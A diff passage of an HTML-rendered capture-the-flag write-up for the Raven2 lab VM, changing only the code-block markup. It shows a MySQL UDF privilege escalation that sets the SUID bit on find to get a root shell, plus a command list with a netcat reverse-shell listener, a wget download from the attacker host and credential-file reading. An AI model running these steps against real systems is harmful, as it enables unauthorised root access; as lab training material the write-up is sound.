-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;/tmp/1518.so&#39;</span><span class="p">));</span>
-</span></code></pre></div>
+<div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
+<span class="normal"><a href="#__codelineno-24-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="k">create</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">foo</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="kt">blob</span><span class="p">);</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="k">values</span><span class="p">(</span><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;/tmp/1518.so&#39;</span><span class="p">));</span>
+</span></code></pre></div></td></tr></table></div>
 <p>So far:</p>
 <p>![Mysql capture](img(raven2-19.png)</p>
 <p>Now, we are going to load that file from the column to a different location, let's say /usr/lib/mysql/plugin/1518.so:</p>
-<div class="language-mysql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">dumpfile</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/1518.so&#39;</span><span class="p">;</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="c1"># We will execute</span>
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="k">create</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">do_system</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="kt">integer</span><span class="w"> </span><span class="k">soname</span><span class="w"> </span><span class="s1">&#39;1518.so&#39;</span><span class="p">;</span>
-</span></code></pre></div>
+<div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
+<span class="normal"><a href="#__codelineno-25-2">2</a></span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span>
+<span class="normal"><a href="#__codelineno-25-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">foo</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">dumpfile</span><span class="w"> </span><span class="s1">&#39;/usr/lib/mysql/plugin/1518.so&#39;</span><span class="p">;</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="c1"># We will execute</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="k">create</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">do_system</span><span class="w"> </span><span class="k">returns</span><span class="w"> </span><span class="kt">integer</span><span class="w"> </span><span class="k">soname</span><span class="w"> </span><span class="s1">&#39;1518.so&#39;</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>If we now execute: </p>
-<div class="language-mysql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">select</span><span class="w"> </span><span class="n">do_system</span><span class="p">(</span><span class="s1">&#39;chmod u+s /usr/bin/find&#39;</span><span class="p">);</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="k">exit</span>
-</span></code></pre></div>
+<div class="language-mysql highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="k">select</span><span class="w"> </span><span class="n">do_system</span><span class="p">(</span><span class="s1">&#39;chmod u+s /usr/bin/find&#39;</span><span class="p">);</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="k">exit</span>
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="MYSQL creation of a function" src="../img/raven2-20.png" /></p>
 <p>Now, if we check suid binaries, we can see "find" among them.</p>
 <p><img alt="Binary find among the suid files" src="../img/raven2-21.png" /></p>
 <p>Now, if we create a file, such as "tocado" in the /tmp folder of the victim machine and we execute 'find file -exec code', every time that the command finds the file it will execute the following code as root.</p>
 <p>Then, we can run:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>touch<span class="w"> </span>tocado
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>find<span class="w"> </span>tocado<span class="w"> </span>-exec<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span><span class="se">\;</span>
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>find<span class="w"> </span>tocado<span class="w"> </span>-exec<span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span><span class="se">\;</span>
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>whoami
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span>
+<span class="normal"><a href="#__codelineno-27-3">3</a></span>
+<span class="normal"><a href="#__codelineno-27-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>touch<span class="w"> </span>tocado
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a>find<span class="w"> </span>tocado<span class="w"> </span>-exec<span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span><span class="se">\;</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3"></a>find<span class="w"> </span>tocado<span class="w"> </span>-exec<span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span><span class="se">\;</span>
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4"></a>whoami
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="Capture of privilege escalation" src="../img/raven2-22.png" /></p>
 <h4 id="getting-the-flag">Getting the flag</h4>
 <p>We just need to go to the root folder:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">cd</span><span class="w"> </span>/root
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>ls<span class="w"> </span>-la
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>cat<span class="w"> </span>flag4.txt
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
+<span class="normal"><a href="#__codelineno-28-2">2</a></span>
+<span class="normal"><a href="#__codelineno-28-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="nb">cd</span><span class="w"> </span>/root
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a>ls<span class="w"> </span>-la
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a>cat<span class="w"> </span>flag4.txt
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="flag4.txt" src="../img/raven2-23.png" /></p>
 <p>flag4.txt in plain text:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>  ___                   ___ ___ 
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a> | _ \__ ___ _____ _ _ |_ _|_ _|
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a> |   / _` \ V / -_) &#39; \ | | | | 
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a> |_|_\__,_|\_/\___|_||_|___|___|
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>flag4{df2bc5e951d91581467bb9a2a8ff4425}
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>CONGRATULATIONS on successfully rooting RavenII
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>
-</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>I hope you enjoyed this second interation of the Raven VM
-</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>
-</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>Hit me up on Twitter and let me know what you thought: 
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-29-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-29-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-29-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-29-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-29-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-29-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-29-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-29-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-29-10">10</a></span>
+<span class="normal"><a href="#__codelineno-29-11">11</a></span>
+<span class="normal"><a href="#__codelineno-29-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>  ___                   ___ ___ 
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a> | _ \__ ___ _____ _ _ |_ _|_ _|
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a> |   / _` \ V / -_) &#39; \ | | | | 
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a> |_|_\__,_|\_/\___|_||_|___|___|
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5"></a>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6"></a>flag4{df2bc5e951d91581467bb9a2a8ff4425}
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8"></a>CONGRATULATIONS on successfully rooting RavenII
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9"></a>
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10"></a>I hope you enjoyed this second interation of the Raven VM
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11"></a>
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12"></a>Hit me up on Twitter and let me know what you thought: 
+</span></code></pre></div></td></tr></table></div>
 <h4 id="commands-used-to-exploit-the-machine">Commands used to exploit the machine</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>ip a
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>sudo netdiscover -i eth1 -r 192.168.56.102/24
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>sudo nmap -p- -A 192.168.56.105
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>dirb http://192.168.56.105
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>wpscan --url http://192.168.56.105/wordpress --enumerate u --force --wp-content-dir wp-content
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>python3 anarconder.py
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>nc -lnvc 4444
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>cat wp-config.php
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>cd /tmp
-</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>wget http://192.168.56.102/linuxprivchecker.py
-</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>python /tmp/linuxprivchecker.py
-</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>
-</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>
-</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>cd /var/www/html/
-</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>vi 1518.c
-</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a># and we copy paste the exploit
-</span><span id="__span-30-18"><a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>
-</span><span id="__span-30-19"><a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a># To creates 1518.o from 1518.c
-</span><span id="__span-30-20"><a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a>sudo gcc -g -c 1518.c
-</span><span id="__span-30-21"><a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a>
-</span><span id="__span-30-22"><a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a># To create 1518.so from both 1518.c and 1518.o
-</span><span id="__span-30-23"><a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a>sudo gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc 
-</span><span id="__span-30-24"><a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a>
-</span><span id="__span-30-25"><a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a>mysql -u root -p
-</span><span id="__span-30-26"><a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a>
-</span><span id="__span-30-27"><a id="__codelineno-30-27" name="__codelineno-30-27" href="#__codelineno-30-27"></a># List databases
-</span><span id="__span-30-28"><a id="__codelineno-30-28" name="__codelineno-30-28" href="#__codelineno-30-28"></a>SHOW databases;
-</span><span id="__span-30-29"><a id="__codelineno-30-29" name="__codelineno-30-29" href="#__codelineno-30-29"></a>
-</span><span id="__span-30-30"><a id="__codelineno-30-30" name="__codelineno-30-30" href="#__codelineno-30-30"></a># Select a database
-</span><span id="__span-30-31"><a id="__codelineno-30-31" name="__codelineno-30-31" href="#__codelineno-30-31"></a>use mysql;
-</span><span id="__span-30-32"><a id="__codelineno-30-32" name="__codelineno-30-32" href="#__codelineno-30-32"></a>
-</span><span id="__span-30-33"><a id="__codelineno-30-33" name="__codelineno-30-33" href="#__codelineno-30-33"></a>create table foo(line blob);
-</span><span id="__span-30-34"><a id="__codelineno-30-34" name="__codelineno-30-34" href="#__codelineno-30-34"></a>insert into foo values(load_file(&#39;/tmp/1518.so&#39;));
-</span><span id="__span-30-35"><a id="__codelineno-30-35" name="__codelineno-30-35" href="#__codelineno-30-35"></a>
-</span><span id="__span-30-36"><a id="__codelineno-30-36" name="__codelineno-30-36" href="#__codelineno-30-36"></a>select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/1518.so&#39;;
-</span><span id="__span-30-37"><a id="__codelineno-30-37" name="__codelineno-30-37" href="#__codelineno-30-37"></a>
-</span><span id="__span-30-38"><a id="__codelineno-30-38" name="__codelineno-30-38" href="#__codelineno-30-38"></a># We will execute
-</span><span id="__span-30-39"><a id="__codelineno-30-39" name="__codelineno-30-39" href="#__codelineno-30-39"></a>create function do_system returns integer soname &#39;1518.so&#39;;
-</span><span id="__span-30-40"><a id="__codelineno-30-40" name="__codelineno-30-40" href="#__codelineno-30-40"></a>
-</span><span id="__span-30-41"><a id="__codelineno-30-41" name="__codelineno-30-41" href="#__codelineno-30-41"></a>select do_system(&#39;chmod u+s /usr/bin/find&#39;);
-</span><span id="__span-30-42"><a id="__codelineno-30-42" name="__codelineno-30-42" href="#__codelineno-30-42"></a>exit
-</span><span id="__span-30-43"><a id="__codelineno-30-43" name="__codelineno-30-43" href="#__codelineno-30-43"></a>
-</span><span id="__span-30-44"><a id="__codelineno-30-44" name="__codelineno-30-44" href="#__codelineno-30-44"></a>touch tocado
-</span><span id="__span-30-45"><a id="__codelineno-30-45" name="__codelineno-30-45" href="#__codelineno-30-45"></a>find tocado -exec &quot;whoami&quot; \;
-</span><span id="__span-30-46"><a id="__codelineno-30-46" name="__codelineno-30-46" href="#__codelineno-30-46"></a>find tocado -exec &quot;/bin/sh&quot; \;
-</span><span id="__span-30-47"><a id="__codelineno-30-47" name="__codelineno-30-47" href="#__codelineno-30-47"></a>whoami
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-30-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-30-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-30-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-30-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-30-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-30-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-30-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-30-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-30-10">10</a></span>
+<span class="normal"><a href="#__codelineno-30-11">11</a></span>
+<span class="normal"><a href="#__codelineno-30-12">12</a></span>
+<span class="normal"><a href="#__codelineno-30-13">13</a></span>
+<span class="normal"><a href="#__codelineno-30-14">14</a></span>
+<span class="normal"><a href="#__codelineno-30-15">15</a></span>
+<span class="normal"><a href="#__codelineno-30-16">16</a></span>
+<span class="normal"><a href="#__codelineno-30-17">17</a></span>
+<span class="normal"><a href="#__codelineno-30-18">18</a></span>
+<span class="normal"><a href="#__codelineno-30-19">19</a></span>
+<span class="normal"><a href="#__codelineno-30-20">20</a></span>
+<span class="normal"><a href="#__codelineno-30-21">21</a></span>
+<span class="normal"><a href="#__codelineno-30-22">22</a></span>
+<span class="normal"><a href="#__codelineno-30-23">23</a></span>
+<span class="normal"><a href="#__codelineno-30-24">24</a></span>
+<span class="normal"><a href="#__codelineno-30-25">25</a></span>
+<span class="normal"><a href="#__codelineno-30-26">26</a></span>
+<span class="normal"><a href="#__codelineno-30-27">27</a></span>
+<span class="normal"><a href="#__codelineno-30-28">28</a></span>
+<span class="normal"><a href="#__codelineno-30-29">29</a></span>
+<span class="normal"><a href="#__codelineno-30-30">30</a></span>
+<span class="normal"><a href="#__codelineno-30-31">31</a></span>
+<span class="normal"><a href="#__codelineno-30-32">32</a></span>
+<span class="normal"><a href="#__codelineno-30-33">33</a></span>
+<span class="normal"><a href="#__codelineno-30-34">34</a></span>
+<span class="normal"><a href="#__codelineno-30-35">35</a></span>
+<span class="normal"><a href="#__codelineno-30-36">36</a></span>
+<span class="normal"><a href="#__codelineno-30-37">37</a></span>
+<span class="normal"><a href="#__codelineno-30-38">38</a></span>
+<span class="normal"><a href="#__codelineno-30-39">39</a></span>
+<span class="normal"><a href="#__codelineno-30-40">40</a></span>
+<span class="normal"><a href="#__codelineno-30-41">41</a></span>
+<span class="normal"><a href="#__codelineno-30-42">42</a></span>
+<span class="normal"><a href="#__codelineno-30-43">43</a></span>
+<span class="normal"><a href="#__codelineno-30-44">44</a></span>
+<span class="normal"><a href="#__codelineno-30-45">45</a></span>
+<span class="normal"><a href="#__codelineno-30-46">46</a></span>
+<span class="normal"><a href="#__codelineno-30-47">47</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>ip a
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2"></a>sudo netdiscover -i eth1 -r 192.168.56.102/24
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3"></a>sudo nmap -p- -A 192.168.56.105
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4"></a>dirb http://192.168.56.105
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5"></a>wpscan --url http://192.168.56.105/wordpress --enumerate u --force --wp-content-dir wp-content
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6"></a>python3 anarconder.py
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7"></a>nc -lnvc 4444
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8"></a>
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9"></a>cat wp-config.php
+</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10"></a>cd /tmp
+</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11"></a>wget http://192.168.56.102/linuxprivchecker.py
+</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12"></a>python /tmp/linuxprivchecker.py
+</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13"></a>
+</span><span id="__span-30-14"><a id="__codelineno-30-14" name="__codelineno-30-14"></a>
+</span><span id="__span-30-15"><a id="__codelineno-30-15" name="__codelineno-30-15"></a>cd /var/www/html/
+</span><span id="__span-30-16"><a id="__codelineno-30-16" name="__codelineno-30-16"></a>vi 1518.c
+</span><span id="__span-30-17"><a id="__codelineno-30-17" name="__codelineno-30-17"></a># and we copy paste the exploit
+</span><span id="__span-30-18"><a id="__codelineno-30-18" name="__codelineno-30-18"></a>
+</span><span id="__span-30-19"><a id="__codelineno-30-19" name="__codelineno-30-19"></a># To creates 1518.o from 1518.c
+</span><span id="__span-30-20"><a id="__codelineno-30-20" name="__codelineno-30-20"></a>sudo gcc -g -c 1518.c
+</span><span id="__span-30-21"><a id="__codelineno-30-21" name="__codelineno-30-21"></a>
+</span><span id="__span-30-22"><a id="__codelineno-30-22" name="__codelineno-30-22"></a># To create 1518.so from both 1518.c and 1518.o
+</span><span id="__span-30-23"><a id="__codelineno-30-23" name="__codelineno-30-23"></a>sudo gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc 
+</span><span id="__span-30-24"><a id="__codelineno-30-24" name="__codelineno-30-24"></a>
+</span><span id="__span-30-25"><a id="__codelineno-30-25" name="__codelineno-30-25"></a>mysql -u root -p
+</span><span id="__span-30-26"><a id="__codelineno-30-26" name="__codelineno-30-26"></a>
+</span><span id="__span-30-27"><a id="__codelineno-30-27" name="__codelineno-30-27"></a># List databases
+</span><span id="__span-30-28"><a id="__codelineno-30-28" name="__codelineno-30-28"></a>SHOW databases;
+</span><span id="__span-30-29"><a id="__codelineno-30-29" name="__codelineno-30-29"></a>
+</span><span id="__span-30-30"><a id="__codelineno-30-30" name="__codelineno-30-30"></a># Select a database
+</span><span id="__span-30-31"><a id="__codelineno-30-31" name="__codelineno-30-31"></a>use mysql;
+</span><span id="__span-30-32"><a id="__codelineno-30-32" name="__codelineno-30-32"></a>
+</span><span id="__span-30-33"><a id="__codelineno-30-33" name="__codelineno-30-33"></a>create table foo(line blob);
+</span><span id="__span-30-34"><a id="__codelineno-30-34" name="__codelineno-30-34"></a>insert into foo values(load_file(&#39;/tmp/1518.so&#39;));
+</span><span id="__span-30-35"><a id="__codelineno-30-35" name="__codelineno-30-35"></a>
+</span><span id="__span-30-36"><a id="__codelineno-30-36" name="__codelineno-30-36"></a>select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/1518.so&#39;;
+</span><span id="__span-30-37"><a id="__codelineno-30-37" name="__codelineno-30-37"></a>
+</span><span id="__span-30-38"><a id="__codelineno-30-38" name="__codelineno-30-38"></a># We will execute
+</span><span id="__span-30-39"><a id="__codelineno-30-39" name="__codelineno-30-39"></a>create function do_system returns integer soname &#39;1518.so&#39;;
+</span><span id="__span-30-40"><a id="__codelineno-30-40" name="__codelineno-30-40"></a>
+</span><span id="__span-30-41"><a id="__codelineno-30-41" name="__codelineno-30-41"></a>select do_system(&#39;chmod u+s /usr/bin/find&#39;);
+</span><span id="__span-30-42"><a id="__codelineno-30-42" name="__codelineno-30-42"></a>exit
+</span><span id="__span-30-43"><a id="__codelineno-30-43" name="__codelineno-30-43"></a>
+</span><span id="__span-30-44"><a id="__codelineno-30-44" name="__codelineno-30-44"></a>touch tocado
+</span><span id="__span-30-45"><a id="__codelineno-30-45" name="__codelineno-30-45"></a>find tocado -exec &quot;whoami&quot; \;
+</span><span id="__span-30-46"><a id="__codelineno-30-46" name="__codelineno-30-46"></a>find tocado -exec &quot;/bin/sh&quot; \;
+</span><span id="__span-30-47"><a id="__codelineno-30-47" name="__codelineno-30-47"></a>whoami
+</span></code></pre></div></td></tr></table></div>
 <h4 id="tools">Tools</h4>
 <ul>
 <li><a href="../dirb/">dirb</a>.</li>
@@ -17713,7 +17821,7 @@ Result:</p>
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
